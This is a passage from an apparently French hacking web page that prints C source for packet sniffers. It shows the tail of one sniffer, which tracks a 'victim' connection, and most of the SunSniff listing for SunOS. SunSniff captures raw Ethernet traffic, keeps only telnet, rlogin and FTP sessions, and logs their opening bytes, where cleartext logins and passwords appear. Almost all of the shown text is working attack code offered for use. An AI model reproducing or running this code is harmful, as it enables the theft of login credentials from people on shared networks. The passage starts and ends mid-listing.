<br><tt><font color="#FF0000">&nbsp;&nbsp; }</font></tt>
<br><tt><font color="#FF0000">}</font></tt>
<br>&nbsp;
<p><tt><font color="#FF0000">main()</font></tt>
<br><tt><font color="#FF0000">{</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; int s;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; s=openintf("eth0");</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; ip=(struct iphdr *)(((unsigned
long)&amp;ep.ip)-2);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; tcp=(struct tcphdr *)(((unsigned
long)&amp;ep.tcp)-2);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; signal(SIGHUP, SIG_IGN);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; clear_victim();</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; for(;;)</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; {</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; read_tcp(s);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(victim.active
!= 0) print_data(htons(ip->tot_len)-sizeof(ep.ip)-sizeof(ep.tcp), ep.buff-2);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; }</font></tt>
<br><tt><font color="#FF0000">}</font></tt>
<p><tt><font color="#FF0000">char *hostlookup(unsigned long int in)</font></tt>
<br><tt><font color="#FF0000">{</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; static char blah[1024];</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; struct in_addr i;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; struct hostent *he;</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp; i.s_addr=in;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; he=gethostbyaddr((char *)&amp;i,
sizeof(struct in_addr),AF_INET);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; if(he == NULL) strcpy(blah,
inet_ntoa(i));</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; else strcpy(blah, he->h_name);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; return blah;</font></tt>
<br><tt><font color="#FF0000">}</font></tt>
<p><tt><font color="#FF0000">void clear_victim(void)</font></tt>
<br><tt><font color="#FF0000">{</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; victim.saddr=0;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; victim.daddr=0;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; victim.sport=0;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; victim.dport=0;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; victim.active=0;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; victim.bytes_read=0;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; victim.start_time=0;</font></tt>
<br><tt><font color="#FF0000">}</font></tt>
<br>&nbsp;
<ul>
<li>
Toujours dans les sniffers vous avez SunSniff, &agrave; faire tourner sous
SunOS, en voici le code source:</li>
</ul>
<tt><font color="#FF0000">#include &lt;stdio.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;ctype.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;string.h></font></tt>
<p><tt><font color="#FF0000">#include &lt;sys/time.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;sys/file.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;sys/stropts.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;sys/signal.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;sys/types.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;sys/socket.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;sys/ioctl.h></font></tt>
<p><tt><font color="#FF0000">#include &lt;net/if.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;net/nit_if.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;net/nit_buf.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;net/if_arp.h></font></tt>
<p><tt><font color="#FF0000">#include &lt;netinet/in.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;netinet/if_ether.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;netinet/in_systm.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;netinet/ip.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;netinet/udp.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;netinet/ip_var.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;netinet/udp_var.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;netinet/in_systm.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;netinet/tcp.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;netinet/ip_icmp.h></font></tt>
<p><tt><font color="#FF0000">#include &lt;netdb.h></font></tt>
<br><tt><font color="#FF0000">#include &lt;arpa/inet.h></font></tt>
<p><tt><font color="#FF0000">#define ERR stderr</font></tt>
<p><tt><font color="#FF0000">char&nbsp;&nbsp;&nbsp; *malloc();</font></tt>
<br><tt><font color="#FF0000">char&nbsp;&nbsp;&nbsp; *device,</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
*ProgName,</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
*LogName;</font></tt>
<br><tt><font color="#FF0000">FILE&nbsp;&nbsp;&nbsp; *LOG;</font></tt>
<br><tt><font color="#FF0000">int&nbsp;&nbsp;&nbsp;&nbsp; debug=0;</font></tt>
<p><tt><font color="#FF0000">#define NIT_DEV&nbsp;&nbsp;&nbsp;&nbsp; "/dev/le0"</font></tt>
<br><tt><font color="#FF0000">#define CHUNKSIZE&nbsp;&nbsp; 4096&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
/* device buffer size */</font></tt>
<br><tt><font color="#FF0000">int&nbsp;&nbsp;&nbsp;&nbsp; if_fd = -1;</font></tt>
<br><tt><font color="#FF0000">int&nbsp;&nbsp;&nbsp;&nbsp; Packet[CHUNKSIZE+32];</font></tt>
<p><tt><font color="#FF0000">void Pexit(err,msg)</font></tt>
<br><tt><font color="#FF0000">int err; char *msg;</font></tt>
<br><tt><font color="#FF0000">{ perror(msg);</font></tt>
<br><tt><font color="#FF0000">&nbsp; exit(err); }</font></tt>
<p><tt><font color="#FF0000">void Zexit(err,msg)</font></tt>
<br><tt><font color="#FF0000">int err; char *msg;</font></tt>
<br><tt><font color="#FF0000">{ fprintf(ERR,msg);</font></tt>
<br><tt><font color="#FF0000">&nbsp; exit(err); }</font></tt>
<p><tt><font color="#FF0000">#define IP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
((struct ip *)Packet)</font></tt>
<br><tt><font color="#FF0000">#define IP_OFFSET&nbsp;&nbsp; (0x1FFF)</font></tt>
<br><tt><font color="#FF0000">#define SZETH&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
(sizeof(struct ether_header))</font></tt>
<br><tt><font color="#FF0000">#define IPLEN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
(ntohs(ip->ip_len))</font></tt>
<br><tt><font color="#FF0000">#define IPHLEN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
(ip->ip_hl)</font></tt>
<br><tt><font color="#FF0000">#define TCPOFF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
(tcph->th_off)</font></tt>
<br><tt><font color="#FF0000">#define IPS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
(ip->ip_src)</font></tt>
<br><tt><font color="#FF0000">#define IPD&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
(ip->ip_dst)</font></tt>
<br><tt><font color="#FF0000">#define TCPS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
(tcph->th_sport)</font></tt>
<br><tt><font color="#FF0000">#define TCPD&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
(tcph->th_dport)</font></tt>
<br><tt><font color="#FF0000">#define IPeq(s,t)&nbsp;&nbsp; ((s).s_addr
== (t).s_addr)</font></tt>
<p><tt><font color="#FF0000">#define TCPFL(FLAGS) (tcph->th_flags &amp;
(FLAGS))</font></tt>
<p><tt><font color="#FF0000">#define MAXBUFLEN&nbsp; (128)</font></tt>
<br><tt><font color="#FF0000">time_t&nbsp; LastTIME = 0;</font></tt>
<p><tt><font color="#FF0000">struct CREC {</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; struct CREC *Next,</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
*Last;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; time_t&nbsp; Time;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
/* start time */</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; struct in_addr SRCip,</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
DSTip;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; u_int&nbsp;&nbsp;
SRCport,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /*
src/dst ports */</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
DSTport;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; u_char&nbsp; Data[MAXBUFLEN+2];
/* important stuff :-) */</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; u_int&nbsp;&nbsp;
Length;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
/* current data length */</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; u_int&nbsp;&nbsp;
PKcnt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
/* # pkts */</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; u_long&nbsp; LASTseq;</font></tt>
<br><tt><font color="#FF0000">};</font></tt>
<p><tt><font color="#FF0000">struct CREC *CLroot = NULL;</font></tt>
<p><tt><font color="#FF0000">char *Symaddr(ip)</font></tt>
<br><tt><font color="#FF0000">register struct in_addr ip;</font></tt>
<br><tt><font color="#FF0000">{ register struct hostent *he =</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; gethostbyaddr((char
*)&amp;ip.s_addr, sizeof(struct in_addr),AF_INET);</font></tt>
<p><tt><font color="#FF0000">&nbsp; return( (he)?(he->h_name):(inet_ntoa(ip))
);</font></tt>
<br><tt><font color="#FF0000">}</font></tt>
<p><tt><font color="#FF0000">char *TCPflags(flgs)</font></tt>
<br><tt><font color="#FF0000">register u_char flgs;</font></tt>
<br><tt><font color="#FF0000">{ static char iobuf[8];</font></tt>
<br><tt><font color="#FF0000">#define SFL(P,THF,C) iobuf[P]=((flgs &amp;
THF)?C:'-')</font></tt>
<p><tt><font color="#FF0000">&nbsp; SFL(0,TH_FIN, 'F');</font></tt>
<br><tt><font color="#FF0000">&nbsp; SFL(1,TH_SYN, 'S');</font></tt>
<br><tt><font color="#FF0000">&nbsp; SFL(2,TH_RST, 'R');</font></tt>
<br><tt><font color="#FF0000">&nbsp; SFL(3,TH_PUSH,'P');</font></tt>
<br><tt><font color="#FF0000">&nbsp; SFL(4,TH_ACK, 'A');</font></tt>
<br><tt><font color="#FF0000">&nbsp; SFL(5,TH_URG, 'U');</font></tt>
<br><tt><font color="#FF0000">&nbsp; iobuf[6]=0;</font></tt>
<br><tt><font color="#FF0000">&nbsp; return(iobuf);</font></tt>
<br><tt><font color="#FF0000">}</font></tt>
<p><tt><font color="#FF0000">char *SERVp(port)</font></tt>
<br><tt><font color="#FF0000">register u_int port;</font></tt>
<br><tt><font color="#FF0000">{ static char buf[10];</font></tt>
<br><tt><font color="#FF0000">&nbsp; register char *p;</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp; switch(port) {</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; case IPPORT_LOGINSERVER:
p="rlogin"; break;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; case IPPORT_TELNET:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
p="telnet"; break;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; case IPPORT_SMTP:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
p="smtp"; break;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; case IPPORT_FTP:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
p="ftp"; break;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; default: sprintf(buf,"%u",port);
p=buf; break;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; }</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; return(p);</font></tt>
<br><tt><font color="#FF0000">}</font></tt>
<p><tt><font color="#FF0000">char *Ptm(t)</font></tt>
<br><tt><font color="#FF0000">register time_t *t;</font></tt>
<br><tt><font color="#FF0000">{ register char *p = ctime(t);</font></tt>
<br><tt><font color="#FF0000">&nbsp; p[strlen(p)-6]=0; /* strip " YYYY\n"
*/</font></tt>
<br><tt><font color="#FF0000">&nbsp; return(p);</font></tt>
<br><tt><font color="#FF0000">}</font></tt>
<p><tt><font color="#FF0000">char *NOWtm()</font></tt>
<br><tt><font color="#FF0000">{ time_t tm;</font></tt>
<br><tt><font color="#FF0000">&nbsp; time(&amp;tm);</font></tt>
<br><tt><font color="#FF0000">&nbsp; return( Ptm(&amp;tm) );</font></tt>
<br><tt><font color="#FF0000">}</font></tt>
<p><tt><font color="#FF0000">#define MAX(a,b) (((a)>(b))?(a):(b))</font></tt>
<br><tt><font color="#FF0000">#define MIN(a,b) (((a)&lt;(b))?(a):(b))</font></tt>
<p><tt><font color="#FF0000">/* add an item */</font></tt>
<br><tt><font color="#FF0000">#define ADD_NODE(SIP,DIP,SPORT,DPORT,DATA,LEN)
{ \</font></tt>
<br><tt><font color="#FF0000">&nbsp; register struct CREC *CLtmp = \</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
(struct CREC *)malloc(sizeof(struct CREC)); \</font></tt>
<br><tt><font color="#FF0000">&nbsp; time( &amp;(CLtmp->Time) ); \</font></tt>
<br><tt><font color="#FF0000">&nbsp; CLtmp->SRCip.s_addr = SIP.s_addr;
\</font></tt>
<br><tt><font color="#FF0000">&nbsp; CLtmp->DSTip.s_addr = DIP.s_addr;
\</font></tt>
<br><tt><font color="#FF0000">&nbsp; CLtmp->SRCport = SPORT; \</font></tt>
<br><tt><font color="#FF0000">&nbsp; CLtmp->DSTport = DPORT; \</font></tt>
<br><tt><font color="#FF0000">&nbsp; CLtmp->Length = MIN(LEN,MAXBUFLEN);
\</font></tt>
<br><tt><font color="#FF0000">&nbsp; bcopy( (u_char *)DATA, (u_char *)CLtmp->Data,
CLtmp->Length); \</font></tt>
<br><tt><font color="#FF0000">&nbsp; CLtmp->PKcnt = 1; \</font></tt>
<br><tt><font color="#FF0000">&nbsp; CLtmp->Next = CLroot; \</font></tt>
<br><tt><font color="#FF0000">&nbsp; CLtmp->Last = NULL; \</font></tt>
<br><tt><font color="#FF0000">&nbsp; CLroot = CLtmp; \</font></tt>
<br><tt><font color="#FF0000">}</font></tt>
<p><tt><font color="#FF0000">register struct CREC *GET_NODE(Sip,SP,Dip,DP)</font></tt>
<br><tt><font color="#FF0000">register struct in_addr Sip,Dip;</font></tt>
<br><tt><font color="#FF0000">register u_int SP,DP;</font></tt>
<br><tt><font color="#FF0000">{ register struct CREC *CLr = CLroot;</font></tt>
<p><tt><font color="#FF0000">&nbsp; while(CLr != NULL) {</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; if( (CLr->SRCport == SP)
&amp;&amp; (CLr->DSTport == DP) &amp;&amp;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
IPeq(CLr->SRCip,Sip) &amp;&amp; IPeq(CLr->DSTip,Dip) )</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
break;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; CLr = CLr->Next;</font></tt>
<br><tt><font color="#FF0000">&nbsp; }</font></tt>
<br><tt><font color="#FF0000">&nbsp; return(CLr);</font></tt>
<br><tt><font color="#FF0000">}</font></tt>
<p><tt><font color="#FF0000">#define ADDDATA_NODE(CL,DATA,LEN) { \</font></tt>
<br><tt><font color="#FF0000">&nbsp;bcopy((u_char *)DATA, (u_char *)&amp;CL->Data[CL->Length],LEN);
\</font></tt>
<br><tt><font color="#FF0000">&nbsp;CL->Length += LEN; \</font></tt>
<br><tt><font color="#FF0000">}</font></tt>
<p><tt><font color="#FF0000">#define PR_DATA(dp,ln) {&nbsp;&nbsp;&nbsp;
\</font></tt>
<br><tt><font color="#FF0000">&nbsp; register u_char lastc=0; \</font></tt>
<br><tt><font color="#FF0000">&nbsp; while(ln-- >0) { \</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; if(*dp &lt; 32)
{&nbsp; \</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
switch(*dp) { \</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
case '\0': if((lastc=='\r') || (lastc=='\n') || lastc=='\0') \</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
break; \</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
case '\r': \</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
case '\n': fprintf(LOG,"\n&nbsp;&nbsp;&nbsp;&nbsp; : "); \</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
break; \</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
default&nbsp; : fprintf(LOG,"^%c", (*dp + 64)); \</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
break; \</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
} \</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; } else { \</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
if(isprint(*dp)) fputc(*dp,LOG); \</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
else fprintf(LOG,"(%d)",*dp); \</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; } \</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; lastc = *dp++; \</font></tt>
<br><tt><font color="#FF0000">&nbsp; } \</font></tt>
<br><tt><font color="#FF0000">&nbsp; fflush(LOG); \</font></tt>
<br><tt><font color="#FF0000">}</font></tt>
<p><tt><font color="#FF0000">void END_NODE(CLe,d,dl,msg)</font></tt>
<br><tt><font color="#FF0000">register struct CREC *CLe;</font></tt>
<br><tt><font color="#FF0000">register u_char *d;</font></tt>
<br><tt><font color="#FF0000">register int dl;</font></tt>
<br><tt><font color="#FF0000">register char *msg;</font></tt>
<br><tt><font color="#FF0000">{</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; fprintf(LOG,"\n-- TCP/IP LOG
-- TM: %s --\n", Ptm(&amp;CLe->Time));</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; fprintf(LOG," PATH: %s(%s) =>",
Symaddr(CLe->SRCip),SERVp(CLe->SRCport));</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; fprintf(LOG," %s(%s)\n", Symaddr(CLe->DSTip),SERVp(CLe->DSTport));</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; fprintf(LOG," STAT: %s, %d pkts,
%d bytes [%s]\n",</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
NOWtm(),CLe->PKcnt,(CLe->Length+dl),msg);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; fprintf(LOG," DATA: ");</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; { register u_int i = CLe->Length;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; register u_char
*p = CLe->Data;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PR_DATA(p,i);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PR_DATA(d,dl);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; }</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp; fprintf(LOG,"\n-- \n");</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; fflush(LOG);</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp; if(CLe->Next != NULL)</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; CLe->Next->Last = CLe->Last;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; if(CLe->Last != NULL)</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; CLe->Last->Next = CLe->Next;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; else</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; CLroot = CLe->Next;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; free(CLe);</font></tt>
<br><tt><font color="#FF0000">}</font></tt>
<p><tt><font color="#FF0000">/* 30 mins (x 60 seconds) */</font></tt>
<br><tt><font color="#FF0000">#define IDLE_TIMEOUT 1800</font></tt>
<br><tt><font color="#FF0000">#define IDLE_NODE() { \</font></tt>
<br><tt><font color="#FF0000">&nbsp; time_t tm; \</font></tt>
<br><tt><font color="#FF0000">&nbsp; time(&amp;tm); \</font></tt>
<br><tt><font color="#FF0000">&nbsp; if(LastTIME&lt;tm) { \</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; register struct
CREC *CLe,*CLt = CLroot; \</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; LastTIME=(tm+IDLE_TIMEOUT);
tm-=IDLE_TIMEOUT; \</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; while(CLe=CLt) {
\</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CLt=CLe->Next;
\</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(CLe->Time
&lt;tm) \</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
END_NODE(CLe,(u_char *)NULL,0,"IDLE TIMEOUT"); \</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; } \</font></tt>
<br><tt><font color="#FF0000">&nbsp; } \</font></tt>
<br><tt><font color="#FF0000">}</font></tt>
<p><tt><font color="#FF0000">void filter(cp, pktlen)</font></tt>
<br><tt><font color="#FF0000">register char *cp;</font></tt>
<br><tt><font color="#FF0000">register u_int pktlen;</font></tt>
<br><tt><font color="#FF0000">{</font></tt>
<br><tt><font color="#FF0000">&nbsp;register struct ip&nbsp;&nbsp;&nbsp;&nbsp;
*ip;</font></tt>
<br><tt><font color="#FF0000">&nbsp;register struct tcphdr *tcph;</font></tt>
<p><tt><font color="#FF0000">&nbsp;{ register u_short EtherType=ntohs(((struct
ether_header *)cp)->ether_type);</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp; if(EtherType &lt; 0x600) {</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; EtherType = *(u_short
*)(cp + SZETH + 6);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; cp+=8; pktlen-=8;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; }</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp; if(EtherType != ETHERTYPE_IP)
/* chuk it if its not IP */</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return;</font></tt>
<br><tt><font color="#FF0000">&nbsp;}</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; /* ugh, gotta do an alignment
:-( */</font></tt>
<br><tt><font color="#FF0000">&nbsp;bcopy(cp + SZETH, (char *)Packet,(int)(pktlen
- SZETH));</font></tt>
<p><tt><font color="#FF0000">&nbsp;ip = (struct ip *)Packet;</font></tt>
<br><tt><font color="#FF0000">&nbsp;if( ip->ip_p != IPPROTO_TCP) /* chuk
non tcp pkts */</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; return;</font></tt>
<br><tt><font color="#FF0000">&nbsp;tcph = (struct tcphdr *)(Packet + IPHLEN);</font></tt>
<p><tt><font color="#FF0000">&nbsp;if(!( (TCPD == IPPORT_TELNET) ||</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (TCPD
== IPPORT_LOGINSERVER) ||</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (TCPD
== IPPORT_FTP)</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; )) return;</font></tt>
<p><tt><font color="#FF0000">&nbsp;{ register struct CREC *CLm;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; register int length = ((IPLEN
- (IPHLEN * 4)) - (TCPOFF * 4));</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; register u_char *p = (u_char
*)Packet;</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp; p += ((IPHLEN * 4) + (TCPOFF
* 4));</font></tt>
<p><tt><font color="#FF0000">&nbsp;if(debug) {</font></tt>
<br><tt><font color="#FF0000">&nbsp; fprintf(LOG,"PKT: (%s %04X) ", TCPflags(tcph->th_flags),length);</font></tt>
<br><tt><font color="#FF0000">&nbsp; fprintf(LOG,"%s[%s] => ", inet_ntoa(IPS),SERVp(TCPS));</font></tt>
